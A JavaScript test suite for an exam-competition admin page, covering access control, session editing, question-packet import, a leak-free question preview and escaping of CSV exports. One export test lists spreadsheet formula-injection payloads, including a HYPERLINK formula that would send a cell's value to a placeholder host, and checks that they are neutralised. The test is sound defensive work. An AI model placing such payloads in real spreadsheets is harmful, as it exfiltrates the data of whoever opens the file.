import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import test from 'node:test'
import Papa from 'papaparse'
import { answerLayout, submitLabel } from '../src/shared/sc-question-view.js'

// Runs the real admin page script against a fake DOM built from exam-admin.html.
const html = readFileSync('public/dashboard/smart-competition/exam-admin.html', 'utf8')
const source = readFileSync('src/pages/competition/sc-exam-admin.js', 'utf8').replace(/^import .*$/gm, '')
const participantHtml = readFileSync('public/dashboard/smart-competition/sesi-1.html', 'utf8')

function element(classes = '') {
  const names = new Set(classes.split(/\s+/).filter(Boolean))
  const listeners = {}
  const node = {
    value: '', textContent: '', disabled: false, style: {}, children: [],
    classList: {
      add: (name) => names.add(name),
      remove: (name) => names.delete(name),
      contains: (name) => names.has(name),
      toggle: (name, on = !names.has(name)) => { on ? names.add(name) : names.delete(name) }
    },
    set className(value) { names.clear(); value.split(/\s+/).filter(Boolean).forEach((name) => names.add(name)) },
    addEventListener: (type, handler) => { listeners[type] = handler },
    emit: (type) => listeners[type]?.({ preventDefault: () => {} }),
    click: () => node.emit('click'),
    append: (...nodes) => { node.children.push(...nodes) },
    remove: () => {},
    add: (option) => { node.children.push(option) },
    replaceChildren: (...nodes) => { node.children = nodes },
    reset: () => {},
    scrollIntoView: () => {}
  }
  return node
}

const flush = async () => { for (let i = 0; i < 5; i += 1) await new Promise((resolve) => setImmediate(resolve)) }
const stamp = { _seconds: 1_800_000_000 }

const examAdmin = { uid: 'admin', claims: { role: 'competition_manager', competition: 'smart competition' } }
const teamAccount = { uid: 'team-1', claims: { role: null, competition: null } }

async function openAdmin({ save = () => ({ sessionId: 'saved' }), account = examAdmin, parsed, confirm = () => true,
  attempts = [], sessionEvents = [] } = {}) {
  const elements = {}
  for (const [tag, id] of html.matchAll(/<[a-z][^>]*?\sid="([^"]+)"[^>]*>/g)) {
    elements[id] = element(tag.match(/\sclass="([^"]*)"/)?.[1])
  }
  const data = {
    teams: [
      { teamId: 'taken', teamName: 'Taken Team', university: 'Uni A' },
      { teamId: 'free', teamName: 'Free Team', university: 'Uni B' }
    ],
    packets: [{ packetId: 'packet-1', name: 'Packet One', questionCount: 30 }],
    sessions: [
      { sessionId: 'taken-session', teamId: 'taken', packetId: 'packet-1', opensAt: stamp, closesAt: stamp, events: sessionEvents },
      { sessionId: 'draft-session', teamId: null, packetId: 'packet-1', opensAt: stamp, closesAt: stamp, events: [] }
    ],
    attempts
  }
  const body = element()
  body.style.visibility = 'hidden' // as the page's own stylesheet starts it
  const window = { location: { href: '' }, confirm }
  let authChanged
  let signOuts = 0
  const downloads = []
  const previews = []
  const dependencies = {
    document: {
      getElementById: (id) => elements[id] ?? null,
      createElement: () => element(),
      body
    },
    window,
    // Downloads: keep the text of each file the page builds.
    Blob: class { constructor(parts) { downloads.push(parts.join('')) } },
    URL: { createObjectURL: () => 'blob:test', revokeObjectURL: () => {} },
    Option: function Option(text, value) { return Object.assign(element(), { textContent: text, value }) },
    AUTH: {}, FUNCTIONS: {}, STORAGE: {},
    parsePacketCsv: async () => parsed(),
    answerLayout, submitLabel,
    // The preview loads the participant page and fills a parsed copy of it.
    fetch: async (url) => ({ ok: url === 'sesi-1.html', text: async () => participantHtml }),
    DOMParser: class {
      parseFromString(markup) {
        const page = {}
        for (const [tag, id] of markup.matchAll(/<[a-z][^>]*?\sid="([^"]+)"[^>]*>/g)) page[id] = element(tag.match(/\sclass="([^"]*)"/)?.[1])
        const scripts = [...markup.matchAll(/<script/g)].map(() => ({ removed: false, remove() { this.removed = true } }))
        previews.push({ elements: page, scripts })
        return {
          getElementById: (id) => page[id] ?? null, createElement: () => element(),
          querySelectorAll: () => scripts, documentElement: { outerHTML: '<html>participant page</html>' }
        }
      }
    },
    parsePacketPdf: async () => parsed(),
    signOut: async () => { signOuts += 1 },
    getRoleClaims: async (user) => {
      if (user.lookupFails) throw new Error('role lookup failed')
      return user.claims
    },
    onAuthStateChanged: (_auth, callback) => {
      authChanged = callback
      callback(account)
    },
    httpsCallable: (_functions, name) => async (payload) => ({ data: name === 'getAdminExamData' ? data : await save(name, payload) })
  }
  new Function(...Object.keys(dependencies), source)(...Object.values(dependencies))
  await flush()
  const row = (index) => elements['exam-session-list'].children[index]
  return {
    $: (id) => elements[id],
    team: (id) => elements['session-team'].children.find((option) => option.value === id),
    edit: (index) => row(index).children[4].children.find((node) => node.textContent === 'Edit').click(),
    async submit() { elements['exam-session-form'].emit('submit'); await flush() },
    async accountChanges(user) { authChanged(user); await flush() },
    async importFile() {
      elements['packet-name'].value = 'Packet'
      elements['packet-file'].files = [{ name: 'packet.csv' }]
      elements['packet-import'].click()
      await flush()
    },
    rows: () => elements['packet-question-list'].children,
    // Column order of the review table: number, question, answer, category, tolerance, image, formula, remove.
    control: (row, column) => elements['packet-question-list'].children[row].children[column].children[0],
    signOuts: () => signOuts,
    async click(row, label) {
      row.children.at(-1).children.find((node) => node.textContent === label).click()
      await flush()
    },
    sessionRow: (index) => row(index),
    packetRow: (index) => elements['packet-library-list'].children[index],
    downloads,
    previews,
    location: window.location,
    visibility: () => body.style.visibility
  }
}

test('leaves without ending the shared login when another account takes over', async () => {
  const page = await openAdmin()
  assert.equal(page.visibility(), 'visible')
  await page.accountChanges(teamAccount)
  assert.equal(page.signOuts(), 0)
  assert.equal(page.visibility(), 'hidden')
  assert.equal(page.location.href, '../../login.html')
})

test('does not sign out a non-admin who opens the page, and shows them nothing', async () => {
  const page = await openAdmin({ account: teamAccount })
  assert.equal(page.signOuts(), 0)
  assert.equal(page.visibility(), 'hidden')
  assert.equal(page.location.href, '../../login.html')
})

test('does not sign anyone out when the role check fails, and shows nothing', async () => {
  const page = await openAdmin({ account: { uid: 'unknown', lookupFails: true } })
  assert.equal(page.signOuts(), 0)
  assert.equal(page.visibility(), 'hidden')
  assert.equal(page.location.href, '../../login.html')
})

test('still signs the admin out from the Log Out button', async () => {
  const page = await openAdmin()
  page.$('exam-admin-logout').click()
  await flush()
  assert.equal(page.signOuts(), 1)
})

test('does not let a team that already has a session be chosen for another', async () => {
  const page = await openAdmin()
  assert.equal(page.team('taken').disabled, true)
  assert.match(page.team('taken').textContent, /has a session.*Edit/i)
  assert.equal(page.team('free').disabled, false)
  assert.doesNotMatch(page.team('free').textContent, /has a session/i)
})

test('keeps the team available only while its own session is being edited', async () => {
  const page = await openAdmin()
  page.edit(0)
  assert.equal(page.team('taken').disabled, false)
  assert.equal(page.$('session-team').value, 'taken')
  assert.equal(page.$('session-team').disabled, true)
  page.$('session-reset').click()
  assert.equal(page.team('taken').disabled, true)
})

test('keeps taken teams unavailable while a draft is being edited', async () => {
  const page = await openAdmin()
  page.edit(1)
  assert.equal(page.team('taken').disabled, true)
  assert.equal(page.team('free').disabled, false)
})

test('shows a rejected session save beside the form', async () => {
  const page = await openAdmin({ save: () => { throw new Error('A team can be assigned to only one exam session.') } })
  await page.submit()
  assert.match(page.$('session-message')?.textContent ?? '', /only one exam session/)
  assert.equal(page.$('session-message').classList.contains('d-none'), false)
  assert.equal(page.$('exam-admin-message').textContent, '')
})

test('shows a successful session save beside the form and clears it for a new draft', async () => {
  const page = await openAdmin()
  await page.submit()
  assert.match(page.$('session-message')?.textContent ?? '', /Session saved/)
  page.$('session-reset').click()
  assert.equal(page.$('session-message').classList.contains('d-none'), true)
})

const categoryAt = (index) => index < 20 ? 'Short Answer' : index < 25 ? 'Long Answer' : index < 28 ? 'List-Based' : 'Calculation'
const importedRows = (count = 30) => Array.from({ length: count }, (_, index) => ({
  number: index + 1, question: `Question ${index + 1}`, answer: `Answer ${index + 1}`,
  category: categoryAt(index), assets: [], formulaLatex: '', tolerance: categoryAt(index) === 'Calculation' ? 0.5 : null
}))
const saveDisabled = (page) => page.$('packet-save').disabled

test('lets the packet be saved once every flagged row is corrected', async () => {
  const page = await openAdmin({ parsed: () => {
    const questions = importedRows()
    questions[6].answer = ''
    return { questions, warnings: ['Question 7 has no answer key.'], notices: [] }
  } })
  await page.importFile()
  assert.equal(saveDisabled(page), true)
  const answer = page.control(6, 2)
  answer.value = 'Corrected'
  answer.emit('input')
  assert.equal(saveDisabled(page), false)
  assert.equal(page.$('packet-warnings').classList.contains('d-none'), true)
})

test('lets an extra imported row be deleted after confirming', async () => {
  let allow = false
  const page = await openAdmin({
    confirm: () => allow,
    parsed: () => ({ questions: importedRows(31), warnings: ['Expected 30 questions, found 31.'], notices: [] })
  })
  await page.importFile()
  page.control(30, 7).click()
  assert.equal(page.rows().length, 31)
  allow = true
  const untouched = page.rows()[0]
  page.control(30, 7).click()
  assert.equal(page.rows().length, 30)
  assert.equal(page.rows()[0], untouched, 'other rows keep their controls and chosen images')
  assert.equal(page.$('packet-row-count').textContent, '30')
  assert.equal(saveDisabled(page), false)
})

test('holds Save until file notices are confirmed, again after each import', async () => {
  const page = await openAdmin({ parsed: () => ({
    questions: importedRows(), warnings: [], notices: ['Left out text found after the table: worked solution'] })
  })
  await page.importFile()
  assert.equal(saveDisabled(page), true)
  assert.equal(page.$('packet-notices')?.classList.contains('d-none'), false)
  assert.match(page.$('packet-notice-list').textContent, /worked solution/)
  page.$('packet-confirm-notices').click()
  assert.equal(saveDisabled(page), false)
  assert.equal(page.$('packet-notices').classList.contains('d-none'), true)
  await page.importFile()
  assert.equal(saveDisabled(page), true)
})

const exportHeaders = ['Team', 'Team ID', 'Packet', 'Question', 'Category', 'Submitted Answer', 'Answer Key', 'Verdict', 'Judge Score']
const exportRow = (answer, team = 'Alpha') => ({
  Team: team, 'Team ID': 'team-1', Packet: 'Packet One', Question: 1, Category: 'Long Answer',
  'Submitted Answer': answer, 'Answer Key': 'key', Verdict: '', 'Judge Score': ''
})

async function exportCells(rows) {
  const page = await openAdmin({ save: () => ({ rows }) })
  await page.click(page.sessionRow(0), 'Export CSV')
  const parsed = Papa.parse(page.downloads.at(-1).replace(/^﻿/, ''), { header: true, delimiter: ',' })
  assert.deepEqual(parsed.meta.fields, exportHeaders)
  return parsed.data
}

test('stops participant text from running as a spreadsheet formula in the export', async () => {
  const dangerous = [
    '=HYPERLINK("http://example.test/?k="&G2,"open")', '+1+cmd', '-2+3+cmd', '@SUM(A1:A9)',
    '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '-cmd'
  ]
  const rows = await exportCells(dangerous.map((answer) => exportRow(answer, '=2+2')))
  dangerous.forEach((answer, index) => {
    // After a leading tab or return the formula is guarded too, in case the spreadsheet starts a new cell there.
    const expected = /^[\t\r]/.test(answer) ? `'${answer[0]}'${answer.slice(1)}` : `'${answer}`
    assert.equal(rows[index]['Submitted Answer'], expected, JSON.stringify(answer))
    assert.equal(rows[index].Team, "'=2+2")
  })
})

test('guards formulas that a spreadsheet splitting on semicolons or tabs would expose', async () => {
  const rows = await exportCells([exportRow('Slate;=1+1'), exportRow('Slate;  @SUM(A1)'), exportRow('first line\n=1+1')])
  assert.equal(rows[0]['Submitted Answer'], "Slate;'=1+1")
  assert.equal(rows[1]['Submitted Answer'], "Slate;  '@SUM(A1)")
  assert.equal(rows[2]['Submitted Answer'], "first line\n'=1+1")
})

test('leaves ordinary answers and plain numbers unchanged in the export', async () => {
  const ordinary = ['Tortuosity', '-5', '+3.5', '-1.2e-3', '-.5', 'Steam-Assisted Gravity Drainage (SAGD)', 'a = b', 'Gneiss, Schist; Slate', 'x@y', '']
  const rows = await exportCells(ordinary.map((answer) => exportRow(answer)))
  ordinary.forEach((answer, index) => assert.equal(rows[index]['Submitted Answer'], answer, JSON.stringify(answer)))
  assert.equal(rows[0].Question, '1')
})

test('keeps Extract CSV as written, so a packet can be imported again unchanged', async () => {
  const packet = { name: 'Packet One', questions: [{ number: 1, question: '=mc^2 stands for?', answer: '-x', category: 'Short Answer' }] }
  const page = await openAdmin({ save: () => packet })
  await page.click(page.packetRow(0), 'Extract CSV')
  const [row] = Papa.parse(page.downloads.at(-1).replace(/^﻿/, ''), { header: true }).data
  assert.deepEqual([row.Question, row.Answer], ['=mc^2 stands for?', '-x'])
})

const allText = (node) => [node.textContent, ...(node.children || []).map(allText)].filter(Boolean).join('\n')
const attemptFor = (status, extra = {}) => ({ teamId: 'taken', status, completedThrough: 0, submissionReason: null, events: [], ...extra })

test('locks the packet once the team has started, and unlocks the form for a new draft', async () => {
  const page = await openAdmin({ attempts: [attemptFor('in_progress')] })
  page.edit(0)
  assert.equal(page.$('session-packet').disabled, true)
  assert.match(page.$('session-message').textContent, /already started.*packet/i)
  page.$('session-reset').click()
  assert.equal(page.$('session-packet').disabled, false)
})

test('leaves the packet editable before the team starts and for drafts', async () => {
  const page = await openAdmin({ attempts: [attemptFor('submitted')] })
  page.edit(1)
  assert.equal(page.$('session-packet').disabled, false)
  const fresh = await openAdmin()
  fresh.edit(0)
  assert.equal(fresh.$('session-packet').disabled, false)
})

test('shows how an attempt ended and how far the team got', async () => {
  const page = await openAdmin({ attempts: [attemptFor('submitted', { submissionReason: 'reconnect_cutoff', completedThrough: 12 })] })
  const status = allText(page.sessionRow(0).children[3])
  assert.match(status, /submitted/i)
  assert.match(status, /away longer than 3 minutes/i)
  assert.match(status, /12 of 30/)
})

test('lists session edits, resumes and cutoffs together in time order', async () => {
  const at = (seconds) => ({ _seconds: 1_800_000_000 + seconds })
  const page = await openAdmin({
    sessionEvents: [
      { type: 'session_updated', at: at(50), previous: { packetId: 'old', teamId: 'taken', opensAt: at(0), closesAt: at(900) },
        current: { packetId: 'packet-1', teamId: 'taken', opensAt: at(0), closesAt: at(990) } },
      { type: 'session_created', at: at(10) }
    ],
    attempts: [attemptFor('submitted', { events: [
      { type: 'reconnect_cutoff', at: at(300) }, { type: 'started', at: at(100) }, { type: 'resumed', at: at(200) }
    ] })]
  })
  const history = allText(page.sessionRow(0).children[4])
  const order = ['Session created', 'Session changed (packet, closing time)', 'Exam started', 'Exam page resumed', 'Cut off']
    .map((label) => history.indexOf(label))
  assert.ok(order.every((position) => position >= 0), history)
  assert.deepEqual(order, [...order].sort((a, b) => a - b))
  assert.match(history, /History \(5\)/)
})

const previewPacket = {
  name: 'Packet One',
  questions: [
    { number: 1, category: 'List-Based', question: 'Name two valves', answer: 'SECRET-KEY', formulaLatex: 'N = 7758', assets: ['SC_ExamAssets/a/diagram.png'] },
    { number: 2, category: 'Calculation', question: 'Compute it', answer: 'SECRET-TWO', formulaLatex: '', assets: [] }
  ]
}
const previewServer = (name) => name === 'getExamAssetUrl' ? { url: 'https://example.test/diagram.png' } : previewPacket

test('previews a question on the participant page, with its image and formula but never the key', async () => {
  const page = await openAdmin({ save: previewServer })
  await page.click(page.sessionRow(0), 'Preview')
  const { elements: shown, scripts } = page.previews.at(-1)
  assert.equal(shown['question-text'].textContent, 'Name two valves')
  assert.match(shown['question-heading'].textContent, /Question 1 of 2 · List-Based/)
  assert.equal(shown['exam-answer-long'].classList.contains('d-none'), false)
  assert.equal(shown['exam-answer-long'].disabled, true)
  assert.equal(shown['exam-continue'].disabled, true)
  assert.equal(shown['answer-hint'].classList.contains('d-none'), false)
  assert.equal(shown['exam-panel'].classList.contains('d-none'), false)
  assert.equal(shown['question-assets'].children[0].src, 'https://example.test/diagram.png')
  assert.equal(allText(shown['question-formula']), 'N = 7758')
  assert.ok(scripts.length > 0 && scripts.every((script) => script.removed), 'the preview must not run the exam script')
  assert.doesNotMatch(Object.values(shown).map(allText).join(), /SECRET/)
  assert.match(page.$('exam-preview-frame').srcdoc, /^<!DOCTYPE html><html>participant page/)
})

test('moves between questions in the preview', async () => {
  const page = await openAdmin({ save: previewServer })
  await page.click(page.sessionRow(0), 'Preview')
  assert.equal(page.$('preview-previous').disabled, true)
  page.$('preview-next').click()
  await flush()
  const { elements: shown } = page.previews.at(-1)
  assert.equal(shown['question-text'].textContent, 'Compute it')
  assert.equal(shown['exam-answer-short'].type, 'number')
  assert.equal(shown['exam-continue'].textContent, 'Submit exam')
  assert.equal(page.$('preview-next').disabled, true)
  assert.match(page.$('preview-count').textContent, /2 \/ 2 · 60 s/)
})

test('links the two Smart Competition manager pages to each other', () => {
  assert.match(html, /<a [^>]*href="manager\.html"/)
  assert.match(readFileSync('public/dashboard/smart-competition/manager.html', 'utf8'), /<a [^>]*href="exam-admin\.html"/)
})
